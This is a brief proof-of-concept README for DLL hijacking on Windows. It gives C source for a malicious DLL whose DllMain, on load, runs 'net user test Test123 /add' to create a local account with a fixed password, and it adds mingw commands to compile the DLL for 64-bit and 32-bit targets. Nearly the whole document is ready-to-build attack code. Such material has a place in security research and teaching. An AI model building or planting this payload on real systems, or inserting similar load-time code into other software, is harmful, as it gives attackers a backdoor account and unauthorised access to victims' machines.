# DLL Hijacking POC


>##### Source code
```
#include <windows.h>
int execute();
BOOL WINAPI DllMain(HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
                        execute();
                        return TRUE;
}

int execute(){
        system("net user test Test123 /add");
        return 0;
}

```
>##### Compiling
```
For 64-bit : x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
For 32-bit : i686-w64-mingw32-gcc hijackme.c -o hijackme.dll -shared
```
